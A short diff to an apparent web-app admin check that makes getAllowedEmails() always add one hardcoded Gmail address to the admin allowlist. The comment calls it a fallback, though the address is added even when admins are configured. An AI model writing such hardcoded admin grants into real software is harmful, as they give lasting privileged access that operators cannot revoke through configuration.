@@ -7,10 +7,16 @@ function getAllowedEmails() {
         process.env.FIREBASE_ADMIN_EMAILS ||
         process.env.NEXT_PUBLIC_ADMIN_EMAILS ||
         '';
-    return raw
+    const list = raw
         .split(',')
         .map((e) => e.trim().toLowerCase())
         .filter(Boolean);
+
+    // Always include the default company admin email as fallback
+    if (!list.includes('altrawaretechnology@gmail.com')) {
+        list.push('altrawaretechnology@gmail.com');
+    }
+    return list;
 }
 
 function setAuthCookie(res) {
